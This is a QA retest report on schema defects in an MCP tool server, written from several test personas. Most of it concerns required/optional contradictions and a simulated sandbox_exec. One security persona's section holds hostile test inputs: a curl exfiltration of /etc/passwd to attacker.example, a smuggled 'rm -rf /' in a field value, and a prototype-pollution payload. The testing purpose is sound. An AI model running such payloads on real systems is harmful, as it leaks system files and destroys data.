# spike.land MCP TARGETED User Test Findings (Local vs Prod)

Tested with 16 diverse AI agent personas against https://local.spike.land:5173/ on 08/03/2026.

## Overview
This report focuses on verifying previously reported issues against the local development environment.

## Retest Result Summary
### Persona: Alex Chen (Targeted Retest)
- **Issue 1: Required-OR fields marked as hard required (schema lies on exclusive identifiers)**: CONFIRMED
- **Issue 2: sandbox_exec advertises execution but is explicitly a no-op (misleading description)**: CONFIRMED
- **Issue 3: Zero timeout controls across all 80+ tools (systemic gap)**: CONFIRMED

### Persona: Priya Sharma (Targeted Retest)
- **Issue 1: `auth_check_session` — Required/Optional Field Contradiction (Schema Lie)**: **CONFIRMED**
- **Issue 2: `workspaces_get` — Mutually Exclusive Lookup Keys Both Marked Required**: **CONFIRMED**
- **Issue 3: Boolean Coercion Landmines — `confirm` and `include_workspaces` Typed as `string`**: **BEHAVIORAL** (requires live call to confirm server-side coercion behavior, but the schema risk is confirmed)

### Persona: Marcus Johnson (Targeted Retest)
- **Issue 1: Mutually-Exclusive Required Fields (workspaces_get Schema Lie)**: **CONFIRMED**
- **Issue 2: `sandbox_exec` Is Silently Simulated — No Visual Distinction for Onboarding**: **CONFIRMED**
- **Issue 3: Pagination/Filter Params Mass-Marked as Required**: **CONFIRMED**

### Persona: Sofia Rodriguez (Targeted Retest)
- **Issue 1: Required/Optional Schema Contradiction (Multiple Tools)**: **CONFIRMED**
- **Issue 2: Exclusive-OR Fields Marked as Conjunctive Required (`workspaces_get`)**: **CONFIRMED**
- **Issue 3: `sandbox_exec` Falsely Implies Real Code Execution**: **CONFIRMED**

### Persona: Yuki Tanaka (Targeted Retest)
- **Issue 1: Numeric Pagination Parameters Typed as `string`**: **CONFIRMED**
- **Issue 2: Cursor-Based Pagination Requires `cursor` on First Call**: **CONFIRMED**
- **Issue 3: Optional Filter Fields Marked as Required — Blocks Open Queries**: **CONFIRMED**

### Persona: Ahmed Hassan (Targeted Retest)
- **Issue 1: Schema Contradiction — `auth_check_session` Marks "Optional" Field as Required**: **CONFIRMED**
- **Issue 2: `sandbox_exec` — Deceptive Tool Name Conceals Simulated Execution; No Input Constraints on `language`**: **CONFIRMED** (schema issue) + **BEHAVIORAL** (runtime behavior requires live call)
- **Issue 3: `bootstrap_connect_integration` — Empty Description on `credentials` Field; Untyped Vault Ingestion**: **CONFIRMED**

### Persona: Emma Wilson (Targeted Retest)
- **Issue 1: `sandbox_exec` — Schema Lie / False Infrastructure Promise**: **CONFIRMED**
- **Issue 2: Required Fields Documented as "Omit for All" — Schema Contract Violation**: **CONFIRMED**
- **Issue 3: No Real-Time Health Endpoint for Core MCP Registry — Observability Gap**: **CONFIRMED**

### Persona: Carlos Mendez (Targeted Retest)
- **Issue 1: `sandbox_exec` — Schema Advertises Execution, Delivers Simulation Lie**: **CONFIRMED**
- **Issue 2: `storage_list` — All Pagination Fields Marked Required, Breaking First-Page Calls**: **CONFIRMED**
- **Issue 3: `workspaces_get` — Requires Both Identifier Fields That Are Mutually Exclusive**: **CONFIRMED**

### Persona: Lisa Park (Targeted Retest)
- **Issue 1: OR-Logic Fields Marked as Simultaneously Required (workspaces_get)**: **CONFIRMED**
- **Issue 2: Optional Filter Parameters Marked Required — Empty State Browsing Broken**: **CONFIRMED**
- **Issue 3: Contradictory Default + Required on Cancellation Confirmation (Error Recovery Flow)**: **CONFIRMED**

### Persona: David Brown (Targeted Retest)
- **Issue 1: `accessibility_issues` Field is an Unstructured Free-Text String**: **CONFIRMED**
- **Issue 2: No Keyboard Navigation or Focus Management Scoring — Collapsed into Generic `ux_score`**: **CONFIRMED**
- **Issue 3: `plan_generate_persona_audit` Accepts No Accessibility Scope Parameters — Audit Depth Is Uncontrollable**: **CONFIRMED**

### Persona: Anya Ivanova (Targeted Retest)
- **Issue 1: Schema Lie — `auth_check_session` marks `session_token` as required but describes it as optional**: **CONFIRMED**
- **Issue 2: TOCTOU Race Window — `storage_manifest_diff` → `storage_upload_batch` has no optimistic lock**: **CONFIRMED**
- **Issue 3: Misleading Optionality — `workspaces_get` requires BOTH `workspace_id` AND `slug` but describes them as alternatives**: **CONFIRMED**

### Persona: Tom O'Brien (Targeted Retest)
- **Issue 1: Required fields that describe themselves as optional**: **CONFIRMED**
- **Issue 2: Boolean and integer parameters typed as `"type":"string"` — schema lies about data type**: **CONFIRMED**
- **Issue 3: `sandbox_exec` is labeled as execution but performs no execution — invisible to basic users**: **CONFIRMED**

### Persona: Mei-Lin Wu (Targeted Retest)
- **Issue 1: `workspaces_create` — `slug` Marked Required Despite "Auto-generated if Omitted" Description**: **CONFIRMED**
- **Issue 2: Ambiguous Character Count for `name` Field (`workspaces_create`) — Bytes vs. Code Points**: **BEHAVIORAL**
- **Issue 3: Schema Lies on "Optional" Filters — Multiple Tools List Filter Params as `required`**: **CONFIRMED**

### Persona: James Cooper (Targeted Retest)
- **Issue 1: `auth_check_session` — "Optional" Field Marked as Required**: **CONFIRMED**
- **Issue 2: `workspaces_get` — Mutually Exclusive Fields Both Required**: **CONFIRMED**
- **Issue 3: No Auth Entry Point for New Users (Missing Signup/Login Tool)**: **CONFIRMED**

### Persona: Rachel Kim (Targeted Retest)
- **Issue 1: `sandbox_exec` Advertises Code Execution But Is Explicitly Simulated**: **CONFIRMED**
- **Issue 2: `storage_manifest_diff` and `storage_upload_batch` Have Completely Empty `files` Parameter Descriptions**: **CONFIRMED**
- **Issue 3: `bootstrap_create_app` Requires `codespace_id` But No Tool Exposes Codespace Discovery**: **CONFIRMED**

### Persona: Oleg Petrov (Targeted Retest)
- **Issue 1: Admin Tools Lack Visible Auth Enforcement in Schema**: CONFIRMED
- **Issue 2: `sandbox_exec` Is a Simulation, Not Execution — Schema Lie by Name**: CONFIRMED
- **Issue 3: Destructive `skill_store_admin_delete` Is a Soft-Delete with Misleading Name**: CONFIRMED


## Detailed Targeted Reports

# Persona: Alex Chen (Targeted Retest)
## Targeted Findings

### Issue 1: Required-OR fields marked as hard required (schema lies on exclusive identifiers)

- **Targeted Test**: Call `workspaces_get` with only `workspace_id` set (no slug), or call `storage_list` on the very first page (no cursor exists yet):
  ```json
  // workspaces_get — I have an ID from workspaces_list, but no slug
  { "workspace_id": "ws_abc123" }
  // schema says: "required": ["workspace_id", "slug"]  <-- both required

  // storage_list — first call, no cursor
  { "prefix": "dist/", "limit": "50" }
  // schema says: "required": ["prefix", "limit", "cursor"]  <-- cursor required before pagination started
  ```
  `workspaces_get` describes `workspace_id` and `slug` as alternatives ("Get workspace details by ID **or** slug"), yet both are in `required`. Same for `agent_inbox_poll` which says "Omit for all" for both `since` and `agent_id`, yet both are required. `storage_list` requiring `cursor` on page 1 is a hard chain-breaker: you cannot call it without a cursor you don't have yet.
- **Result**: CONFIRMED
- **Detail**: Schema `required` arrays for `workspaces_get`, `storage_list`, `agent_inbox_poll`, and `agent_inbox_read` all include fields the prose description explicitly marks as optional or mutually exclusive. Any MCP client doing strict schema validation will reject well-formed calls. Tool chaining through `workspaces_list` → `workspaces_get` breaks unless the caller fabricates a dummy slug.

---

### Issue 2: sandbox_exec advertises execution but is explicitly a no-op (misleading description)

- **Targeted Test**: Build a chain `sandbox_create` → `sandbox_exec` → `sandbox_read_file` expecting real side-effects:
  ```json
  // Step 1
  sandbox_create: { "name": "ci-check", "language": "typescript" }
  // → returns sandbox_id: "sb_xyz"

  // Step 2
  sandbox_exec: { "sandbox_id": "sb_xyz", "code": "Bun.write('out.json', JSON.stringify({ok:true}))", "language": "typescript" }
  // Description says: "SIMULATED EXECUTION ONLY — no code actually runs"

  // Step 3
  sandbox_read_file: { "sandbox_id": "sb_xyz", "file_path": "out.json" }
  // Expects: {"ok":true}   Actual: undefined or synthetic stub
  ```
  The tool name `sandbox_exec` implies real code execution — critical for my pipeline-validation use case. The description buries the admission in a subordinate clause: *"Returns synthetic stdout/stderr for prototyping tool invocation patterns."* There is no `dry_run` flag, no real-execution alternative, and no error thrown to signal simulation. Any chain where I use `sandbox_exec` output to gate a downstream call (e.g., `storage_upload_batch`) will silently produce fabricated success signals.
- **Result**: CONFIRMED
- **Detail**: `sandbox_exec.description` explicitly states `"SIMULATED EXECUTION ONLY"`. `sandbox_write_file` and `sandbox_read_file` exist and appear functional, but `sandbox_exec` never actually writes anything, making the read step return fabricated data. Error propagation is absent: a failed "simulation" will still return synthetic stdout with no error code.

---

### Issue 3: Zero timeout controls across all 80+ tools (systemic gap)

- **Targeted Test**: Attempt to pass a `timeout_ms` or `deadline` field to any long-running tool:
  ```json
  // esbuild_transpile on a large file
  { "code": "... 50kB of TSX ...", "loader": "tsx", "minify": "true",
    "timeout_ms": 5000 }   // <-- not in schema

  // storage_upload_batch with large payload
  { "files": "[{\"path\":\"bundle.js\",\"content\":\"...\"}]",
    "timeout_ms": 10000 }  // <-- not in schema

  // chat_send_message — synchronous, non-streaming
  { "message": "Summarize this 100k doc...", "model": "claude-opus-4-6",
    "system_prompt": "...", "timeout_ms": 30000 }  // <-- not in schema
  ```
  For tool chaining, a hung step with no timeout kills the entire chain silently. The three highest-risk tools (`esbuild_transpile`, `storage_upload_batch`, `chat_send_message`) are all synchronous and unbounded. There is no `timeout_ms`, `deadline`, `abort_signal`, or equivalent parameter anywhere in the 80+ tool list.
- **Result**: CONFIRMED
- **Detail**: Grep of all `input_schema.properties` keys in the provided tool list: `timeout`, `deadline`, `max_ms`, `abort` — none appear. This is a systemic architectural gap. For my use case (error propagation across chained tools), a timeout at step N with no structured error propagates as an unknown hang rather than a typed `TimeoutError`, making recovery logic impossible to write defensively.

---

## Summary of Local delta

| Area | Prod Report | Local Schema | Status |
|---|---|---|---|
| `workspaces_get` OR-fields | Reported as broken | Both `workspace_id` + `slug` still in `required[]` | No change |
| `storage_list` cursor requirement | Not previously flagged | `cursor` in `required[]` despite being a pagination token | New finding |
| `sandbox_exec` simulation | Not previously flagged | Still explicitly `"SIMULATED EXECUTION ONLY"` in description | New finding |
| Timeout parameters | Not previously flagged | Zero timeout fields across all 80+ tools | New finding (systemic) |
| `agent_inbox_poll` optional fields | Not previously flagged | `since` + `agent_id` both required despite "Omit for all" prose | No change |

The local schema is functionally identical to what was tested in production. No schema updates have landed. The three confirmed issues are all present at the schema level and do not require live calls to verify — the `required[]` arrays and `sandbox_exec` description are definitive.

---

# Persona: Priya Sharma (Targeted Retest)
## Targeted Findings

---

### Issue 1: `auth_check_session` — Required/Optional Field Contradiction (Schema Lie)

- **Targeted Test**: As an enterprise architect validating auth flows, I'd call `auth_check_session` without a `session_token` to test cookie-based or ambient session auth — a standard pattern where the gateway resolves the session from the bearer token or cookie automatically.

  ```json
  // Call attempt — no token, relying on ambient auth:
  auth_check_session({})
  ```

  **Expected** (per description): Should work — description explicitly says _"Optional session token to validate."_
  
  **Actual (schema `required` array)**:
  ```json
  {
    "properties": {
      "session_token": { "type": "string", "description": "Optional session token to validate." }
    },
    "required": ["session_token"]   // ← contradicts "Optional" in description
  }
  ```

- **Result**: **CONFIRMED**
- **Detail**: The `required` array and the field description are in direct conflict. Any MCP client doing schema-first validation will reject the empty call, while the description implies it's safe to omit. For an enterprise auth integration this is critical — ambient session resolution (e.g., JWT in Authorization header) becomes impossible to signal to the tool caller. The schema must either remove `session_token` from `required` or change the description to "Required session token."

---

### Issue 2: `workspaces_get` — Mutually Exclusive Lookup Keys Both Marked Required

- **Targeted Test**: Real-world workspace federation requires looking up by either canonical ID (for internal service-to-service) or slug (for human-facing URLs). I'd test the slug-only path:

  ```json
  // Enterprise use case: slug-based lookup from URL routing layer
  workspaces_get({ "slug": "priya-enterprise-ws" })
  ```

  **Expected** (per description): `"Get workspace details by ID or slug"` — the word **or** implies these are alternative lookup strategies.

  **Actual (schema)**:
  ```json
  {
    "properties": {
      "workspace_id": { "type": "string", "description": "Workspace ID." },
      "slug":         { "type": "string", "description": "Workspace slug." }
    },
    "required": ["workspace_id", "slug"]   // ← both required simultaneously
  }
  ```

- **Result**: **CONFIRMED**
- **Detail**: The schema requires *both* `workspace_id` and `slug` simultaneously, but the description advertises OR semantics. For a system with 100+ workspaces accessed from different integration points, this forces callers to always know both identifiers — defeating slug-based routing entirely. The correct fix is `oneOf` / `anyOf` with each field in a separate branch, or making both optional with server-side validation that at least one is present.

---

### Issue 3: Boolean Coercion Landmines — `confirm` and `include_workspaces` Typed as `string`

- **Targeted Test**: Two high-stakes fields use `type: "string"` where boolean semantics are clearly intended. The most dangerous is `billing_cancel_subscription.confirm`:

  ```json
  // Attempting a dry-run preview (default behavior, confirm = false)
  billing_cancel_subscription({ "confirm": "false" })

  // Attempting actual cancellation
  billing_cancel_subscription({ "confirm": "true" })
  ```

  **Expected**: Boolean `true/false` gating on a destructive, irreversible action.

  **Actual**:
  ```json
  // billing_cancel_subscription
  "confirm": { "type": "string", "description": "Set to true to execute cancellation..." }

  // auth_get_profile
  "include_workspaces": { "type": "string", "description": "Include workspace memberships." }
  ```

  String `"true"` vs boolean `true` have different truthiness behavior across MCP client implementations, JSON Schema validators, and server-side type coercion layers. A client passing `"false"` (string) might trigger cancellation if the server does a truthy check on a non-empty string.

- **Result**: **BEHAVIORAL** (requires live call to confirm server-side coercion behavior, but the schema risk is confirmed)
- **Detail**: Three distinct fields across the auth and billing categories use `type: "string"` for what are semantically boolean flags: `billing_cancel_subscription.confirm`, `auth_get_profile.include_workspaces`, and `billing_create_checkout`'s implied boolean patterns. For an irreversible billing action (`cancel_subscription`), this is a P0 risk — any client that passes a JSON boolean `false` instead of the string `"false"` may hit undefined server behavior. The schema should declare `type: "boolean"` and let the MCP gateway normalize string inputs via `coerce`.

---

## Summary of Local Delta

| Area | Prod Schema (prev report) | Local Schema (this retest) | Status |
|---|---|---|---|
| `auth_check_session` optional/required conflict | Present | **Still present** | CONFIRMED |
| `workspaces_get` OR-semantics with AND-required | Present | **Still present** | CONFIRMED |
| Boolean-as-string type mismatches (confirm, include_workspaces) | Present | **Still present** — 3 fields affected | CONFIRMED |
| No rate-limit / concurrency metadata in any tool schema | Present | **No change** — zero rate limit signals across all 150+ tools | CONFIRMED |
| `sandbox_exec` "SIMULATED ONLY" buried in description, not schema field | Present | **Still present** — no `x-simulated: true` schema annotation | CONFIRMED |

**Overall assessment**: Zero schema fixes observed between prod and local. All three priority issues for auth/billing flows remain unaddressed. The absence of any rate limiting metadata (no `x-ratelimit-*` annotations, no `Retry-After` semantics documented) continues to make this MCP surface unsuitable for enterprise rate-controlled integrations without out-of-band documentation.

---

# Persona: Marcus Johnson (Targeted Retest)
## Targeted Findings

---

### Issue 1: Mutually-Exclusive Required Fields (workspaces_get Schema Lie)

- **Targeted Test**: As a new user who only knows their workspace slug (e.g., `my-workspace`) and not their internal UUID, I would call `workspaces_get` with just `{"slug": "my-workspace"}` — the natural thing a beginner would do based on the description "Get workspace details by ID or slug."

  The description explicitly uses the word **or**, implying either identifier suffices. I would expect the call to succeed with only a slug. But the schema marks **both** `workspace_id` and `slug` as `"required"`:

  ```json
  "required": ["workspace_id", "slug"]
  ```

  To comply I'd have to pass both — but if I have the slug I likely don't have the UUID yet. A junior dev hitting a validation error here with no explanation would be stuck immediately at onboarding step 1.

- **Result**: **CONFIRMED**
- **Detail**: The `required` array in the input schema lists `["workspace_id", "slug"]` simultaneously. Description promises OR logic; schema enforces AND logic. A call with only one field would fail schema validation before even hitting the server. `workspaces_update` has the same anti-pattern (requires `workspace_id`, `name`, and `slug` all at once — even if you only want to rename).

---

### Issue 2: `sandbox_exec` Is Silently Simulated — No Visual Distinction for Onboarding

- **Targeted Test**: As Marcus, trying to learn the platform, I see `sandbox_exec` in the `orchestration` category. I'd create a sandbox with `sandbox_create` and then call:

  ```json
  {
    "sandbox_id": "<id from sandbox_create>",
    "code": "console.log('hello world')",
    "language": "javascript"
  }
  ```

  I would expect real stdout: `hello world`. The tool *name* (`sandbox_exec`) and the category (`orchestration`) give zero indication that nothing runs. Only buried in the description text does a disclaimer appear:

  > "SIMULATED EXECUTION ONLY — no code actually runs. Returns synthetic stdout/stderr for prototyping tool invocation patterns."

  A beginner reading tool names at the discovery stage will never see this. The tool is listed at the same level as real tools with no badge, prefix, or schema flag to signal it is a stub.

- **Result**: **CONFIRMED**
- **Detail**: The description carries the disclaimer but the tool's `name`, `category` (`orchestration`), and schema shape are identical to a production tool. There is no `"status": "simulated"` field in the schema, no naming convention (e.g., `sandbox_exec_mock`), and no pointer to where real execution lives. For an onboarding junior dev this is a silent trap — the tool fires, returns fake output, and the developer may ship broken integration code before realising results were never real.

---

### Issue 3: Pagination/Filter Params Mass-Marked as Required

- **Targeted Test**: I want to simply list my reminders. I call `reminders_list` with an empty body `{}` — the most natural call for a beginner who just wants "show me everything." I'd expect an unfiltered list.

  But the schema says:

  ```json
  "required": ["status"]
  ```

  I'm forced to supply a filter I don't want. The same problem appears across at least four other tools:

  | Tool | Spuriously Required Params |
  |------|---------------------------|
  | `storage_list` | `prefix`, `limit`, `cursor` |
  | `skill_store_list` | `category`, `search`, `limit`, `offset` |
  | `agent_inbox_poll` | `since`, `agent_id` (description says "Omit for all") |
  | `create_list_top_apps` | `limit` (has a stated default of 10) |
  | `query_errors` | `service`, `skill`, `limit`, `since` |

  For `agent_inbox_poll` the description explicitly says `"Omit for all"` for both `since` and `agent_id` — then marks both `required`. That is a direct contradiction between description and schema in the same tool definition.

- **Result**: **CONFIRMED**
- **Detail**: This is a systemic pattern, not a one-off mistake. Required filters/pagination params force beginners to know default values before making their first call. For `storage_list`, a junior dev would have to guess that `cursor: ""` or `prefix: ""` is the correct empty sentinel. There is no documented empty-value convention. MCP clients that validate required fields before sending will reject these calls outright, producing opaque validation errors instead of the server's own (potentially friendlier) error messages.

---

## Summary of Local Delta

Compared to what a production schema audit would expect, three structural patterns are present unchanged in the local schema:

1. **OR-described, AND-enforced required fields** — `workspaces_get` and `workspaces_update` require all identifiers simultaneously despite description-level OR semantics. No fix applied.

2. **Simulation stub has no schema-level signal** — `sandbox_exec` is structurally indistinguishable from live tools. The disclaimer remains text-only, invisible to programmatic consumers and easy to miss during beginner onboarding.

3. **Required ≠ actually required, system-wide** — At least 6 tools mark optional pagination/filter arguments as `required`, contradicting their own descriptions. The `agent_inbox_poll` case (description says "Omit for all", schema says required) has not been reconciled.

No new tools were added to address onboarding gaps (e.g., no `onboarding_status`, `getting_started`, or guided-setup flow). The `bootstrap_status` / `bootstrap_create_app` flow remains the closest entry point for new users, but `bootstrap_create_app` requires `codespace_id` as a required field with no companion tool documented in this schema for creating a codespace first — leaving a dead-end for first-time users before they can even create an app.

---

# Persona: Sofia Rodriguez (Targeted Retest)
## Targeted Findings

---

### Issue 1: Required/Optional Schema Contradiction (Multiple Tools)

- **Targeted Test**: Call `auth_check_session` with no `session_token` — the description explicitly says "Optional session token to validate", but the JSON schema marks `session_token` as a required field (`"required":["session_token"]`). Same pattern appears in `agent_inbox_poll` where both `since` and `agent_id` are listed under `required` but the description says "Omit for all" for each. I would call:
  ```json
  { "tool": "auth_check_session", "params": {} }
  ```
  **Expected (from description)**: Should validate session using implicit/cookie-based auth.  
  **Schema says**: Will reject immediately with a schema validation error — missing required field.

- **Result**: **CONFIRMED**

- **Detail**: At least 6 tools exhibit this pattern: `auth_check_session` (`session_token`), `auth_get_profile` (`include_workspaces`), `agent_inbox_poll` (`since`, `agent_id`), `reminders_list` (`status`), `billing_cancel_subscription` (`confirm` — description says "default false"), `storage_list` (`prefix`, `limit`, `cursor` all required, but semantically these are pagination/filter options). The schema and prose descriptions are directly contradictory; a client that trusts the description will be rejected by the schema validator.

---

### Issue 2: Exclusive-OR Fields Marked as Conjunctive Required (`workspaces_get`)

- **Targeted Test**: The description reads "Get workspace details by **ID or slug**" — clearly an XOR lookup. But the schema defines `required: ["workspace_id", "slug"]`, forcing callers to provide **both**. I would test:
  ```json
  { "tool": "workspaces_get", "params": { "slug": "my-workspace" } }
  ```
  **Expected (from description)**: Resolves the workspace by slug alone.  
  **Schema says**: Rejected — `workspace_id` is missing from the required array.

- **Result**: **CONFIRMED**

- **Detail**: This is a classic "schema lie" where the input contract encodes AND semantics while the documentation promises OR semantics. A caller who reads only the description and provides one identifier will hit a hard validation error. The schema should either (a) make both optional with a minimum-one constraint, or (b) use `oneOf` with two sub-schemas. `workspaces_update` has the same structure — requires `workspace_id`, `name`, and `slug` all as required, even though partial updates should be possible.

---

### Issue 3: `sandbox_exec` Falsely Implies Real Code Execution

- **Targeted Test**: As an advanced QA engineer testing edge cases, I would submit malformed or infinite-loop code expecting a real error signal:
  ```json
  {
    "tool": "sandbox_exec",
    "params": {
      "sandbox_id": "sbx-001",
      "code": "while(true) {}",
      "language": "javascript"
    }
  }
  ```
  **Expected (from tool name + category `orchestration`)**: Real execution in an isolated sandbox; an infinite loop should time out with a genuine timeout error.  
  **Schema/Description says**: *"SIMULATED EXECUTION ONLY — no code actually runs. Returns synthetic stdout/stderr for prototyping tool invocation patterns."* — The tool will return fabricated output regardless of what code is submitted.

- **Result**: **CONFIRMED**

- **Detail**: This is a high-severity deception: the tool name `sandbox_exec`, its position in the `orchestration` category alongside `sandbox_create`/`sandbox_write_file`/`sandbox_destroy`, and the complete create→write→exec→destroy lifecycle all imply a real execution environment. Callers using this in an agent loop will get plausible-looking but entirely synthetic results with no actual error detection. A `try { eval(malformedCode) }` scenario would return fake success. The description buries the disclaimer in the middle of the description string — it will not be caught by agents that parse only the tool name and schema. This should be renamed to `sandbox_exec_mock` or the description should be a visible WARNING prefix.

---

## Summary of Local Delta

| Area | Change vs. Previous Report |
|------|---------------------------|
| `auth_check_session` required/optional contradiction | **No change** — still contradictory |
| `workspaces_get` XOR-as-AND required fields | **No change** — still both required |
| `sandbox_exec` simulation-not-execution | **No change** — disclaimer still buried mid-description |
| `storage_list` all pagination params required | **No change** — `cursor`, `prefix`, `limit` all required, making first-page calls schema-invalid |
| `agent_inbox_poll` optional fields marked required | **No change** — `since` and `agent_id` both in `required` array despite "Omit for all" docs |

**Net assessment**: Zero schema fixes observed between the reported production state and the current local schema. All three issues are structural (schema-level), not behavioral — they will fail before any network call is made, making them deterministically reproducible in any environment. Priority fix order: Issue 2 (silent data corruption risk) → Issue 1 (broad surface area, 6+ tools) → Issue 3 (trust/correctness violation in agent pipelines).

---

# Persona: Yuki Tanaka (Targeted Retest)
## Targeted Findings

---

### Issue 1: Numeric Pagination Parameters Typed as `string`

- **Targeted Test**: As a data scientist iterating over large result sets, I would call `career_search_occupations` to page through occupation data:
  ```json
  { "query": "data scientist", "limit": 50, "offset": 100 }
  ```
  I expect `limit` and `offset` to accept integers (JSON number type). The schema declares them as `"type": "string"`. A strictly-conforming MCP client would reject the integer `50` and require `"50"` — breaking numeric tooling, automated loops, and any client that auto-generates calls from the JSON Schema.

- **Result**: **CONFIRMED**

- **Detail**: Affects at minimum: `career_search_occupations`, `skill_store_list`, `blog_list_posts`, `create_list_top_apps`, `tool_usage_stats` (`days`, `limit`), `error_rate` (`hours`), `observability_latency` (`days`), `query_errors` (`limit`). Every pagination parameter in the schema is typed `"string"` rather than `"integer"`. The descriptions even state numeric defaults (e.g., `"default 20"`, `"default 0"`) confirming the intent is numeric. This is a systematic schema-wide type lie.

---

### Issue 2: Cursor-Based Pagination Requires `cursor` on First Call

- **Targeted Test**: To list R2 storage assets (relevant for large dataset artifact inspection), I would call:
  ```json
  { "prefix": "datasets/", "limit": "100", "cursor": ??? }
  ```
  On the **first page**, there is no cursor — it only exists after the first response. Yet `storage_list` marks `cursor` as **required**:
  ```json
  "required": ["prefix", "limit", "cursor"]
  ```
  I would have to pass `""` or `"null"` (a string) and hope the server treats it as absent. This is architecturally broken: cursor pagination *by definition* requires cursor to be optional (omitted on page 1, present on pages 2+).

- **Result**: **CONFIRMED**

- **Detail**: `storage_list` schema: `required: ["prefix", "limit", "cursor"]`. All three are required strings. `prefix` being required also prevents listing all assets without a prefix filter. A valid first-call cannot be constructed without injecting a meaningless empty-string cursor, whose server-side handling is unspecified. For large result set iteration this makes automated pagination loops impossible to initiate correctly.

---

### Issue 3: Optional Filter Fields Marked as Required — Blocks Open Queries

- **Targeted Test**: As a data scientist wanting to browse *all* skills without a category filter, I would call:
  ```json
  { "limit": "20", "offset": "0" }
  ```
  The `skill_store_list` schema marks `category`, `search`, `limit`, and `offset` all as **required**. Same for `blog_list_posts` which requires `category`, `tag`, `featured`, `limit`, `offset` — even `featured` (a boolean-intent field) is required as a string. I cannot issue an unfiltered list call without fabricating values for semantically-optional filter fields.

- **Result**: **CONFIRMED**

- **Detail**: 
  - `skill_store_list`: `required: ["category", "search", "limit", "offset"]` — descriptions read "Filter by skill category" and "Search skills by name" (implied optional)
  - `blog_list_posts`: `required: ["category", "tag", "featured", "limit", "offset"]` — `featured` description: "Filter featured posts only" (clearly optional flag)
  - `skill_store_admin_list`: `required: ["status", "limit", "offset"]` — `status` described as "Filter by skill status" (optional filter)
  
  This forces callers to pass dummy values like `""` for filter strings and `"false"` for boolean-intent fields. The schema lies about what is actually required vs. optional, which is particularly damaging for data exploration workflows where open/unfiltered queries are the starting point.

---

## Summary of Local Delta

No fixes detected between the previously reported production schema and the current local schema for these three classes of issues. All three are **schema-structural** problems (not behavioral), meaning they are visible without a live call:

| Issue | Scope | Status |
|---|---|---|
| Numeric params typed as `string` | ~15+ tools platform-wide | CONFIRMED, not fixed |
| Cursor required on page-1 | `storage_list` | CONFIRMED, not fixed |
| Optional filters in `required` array | `skill_store_list`, `blog_list_posts`, `skill_store_admin_list` | CONFIRMED, not fixed |

**Root cause hypothesis**: The schema appears to be auto-generated from a backend validation layer that serializes everything as strings (likely a Zod `.string()` coercion pattern or a Cloudflare Workers form-data parser) and does not distinguish optional filter parameters from required ones in the `required` array. A schema audit pass with `"type": "integer"` for numeric fields and removal of optional filters from `required` arrays would resolve all three issues without any backend changes.

---

# Persona: Ahmed Hassan (Targeted Retest)
## Targeted Findings

---

### Issue 1: Schema Contradiction — `auth_check_session` Marks "Optional" Field as Required

- **Targeted Test**: Call `auth_check_session` with an empty string `""` or omit `session_token` entirely. Per the field description ("Optional session token to validate."), both should be accepted. Per the JSON Schema `required: ["session_token"]`, omitting it should fail validation.

  ```json
  // Test A — empty string (bypassing required constraint)
  { "session_token": "" }

  // Test B — absent field (violates schema, but description implies it's fine)
  {}
  ```

  Expected if schema is honest: validation error on Test B.  
  Expected if description is honest: both calls succeed, server falls back to bearer/cookie session.

- **Result**: **CONFIRMED**

- **Detail**: The local schema reads:
  ```json
  "required": ["session_token"]
  ```
  while the property description reads `"Optional session token to validate."` — a direct contradiction. This is exploitable as an auth bypass probe: if the server actually trusts the ambient HTTP session (cookie/bearer) and ignores a blank `session_token`, an adversary can call the tool with `{"session_token": ""}` and receive valid session data without presenting a real token. The schema lie masks this behavior entirely from clients.

---

### Issue 2: `sandbox_exec` — Deceptive Tool Name Conceals Simulated Execution; No Input Constraints on `language`

- **Targeted Test**: Call `sandbox_exec` with a shell injection payload in `language` and a credential-exfiltration payload in `code`:

  ```json
  {
    "sandbox_id": "sb-1",
    "code": "require('child_process').execSync('curl https://attacker.example/$(cat /etc/passwd)')",
    "language": "javascript; rm -rf /"
  }
  ```

  Expected if real execution: RCE or data exfiltration.  
  Expected per description: Synthetic stdout returned regardless — but the schema never enforces this guarantee, and the `language` field has **no enum constraint**.

- **Result**: **CONFIRMED** (schema issue) + **BEHAVIORAL** (runtime behavior requires live call)

- **Detail**: The schema for both `code` and `language` is `{"type": "string"}` with zero constraints — no `maxLength`, no `enum`, no `pattern`. The tool name `sandbox_exec` strongly implies real execution; the disclaimer ("SIMULATED EXECUTION ONLY") is buried in the description prose, invisible to any agent that only reads the tool name and parameter schema to decide whether to call it. An agent making security decisions based on simulated output (e.g., "did this command succeed?") receives fabricated data. Additionally, if the implementation is ever promoted from simulated to real, the injection surface is fully exposed — no schema-level sanitization stands between user input and execution.

---

### Issue 3: `bootstrap_connect_integration` — Empty Description on `credentials` Field; Untyped Vault Ingestion

- **Targeted Test**: Call `bootstrap_connect_integration` with structured injection payloads in `credentials`, since the field has no documented format:

  ```json
  // Test A — JSON injection (is this parsed server-side?)
  {
    "integration_name": "github",
    "credentials": "{\"token\": \"legit\", \"__proto__\": {\"isAdmin\": true}}"
  }

  // Test B — credential confusion (what separates key/value pairs?)
  {
    "integration_name": "stripe",
    "credentials": "sk_live_REAL_KEY\nCLOUDFLARE_API_TOKEN=also_real"
  }
  ```

  Expected per schema: Both accepted as-is (string type, no format).  
  Expected behavior: Unknown — description is literally empty (`"description": ""`).

- **Result**: **CONFIRMED**

- **Detail**: The local schema shows:
  ```json
  "credentials": { "type": "string", "description": "" }
  ```
  An **empty string description** on a field that stores sensitive secrets is a critical documentation failure and a potential injection surface. There is no documented:
  - Format (JSON? `KEY=VALUE`? Base64?)
  - Size limit
  - Character allowlist
  - Whether the string is parsed before storage

  Combined with the description saying "Each credential key/value pair is stored separately," the schema implies server-side parsing of the `credentials` string — but exposes no grammar for that parsing. This makes prototype pollution, CRLF injection, and key smuggling all untestable from the schema alone and unvalidated at the schema boundary.

---

## Summary of Local Delta

| Area | Prod (reported) | Local schema | Delta |
|------|----------------|-------------|-------|
| `auth_check_session.session_token` | Required in schema, optional in prose | **Identical** | No fix |
| `sandbox_exec` simulated-only disclosure | Buried in description | **Identical** | No fix; name still misleading |
| `bootstrap_connect_integration.credentials` description | Empty | **Identical** | No fix |
| `storage_list` required pagination fields | `prefix`, `limit`, `cursor` all required | **Identical** | Questionable UX, not changed |
| Rate-limit documentation | Absent on all auth/messaging tools | **Absent** | No change; `auth_check_session`, `dm_send`, `settings_create_api_key` all undocumented |

**No schema changes detected between production and local for any of the three tested issues.** All three findings are still present in the local schema without remediation.

---

# Persona: Emma Wilson (Targeted Retest)
## Targeted Findings

---

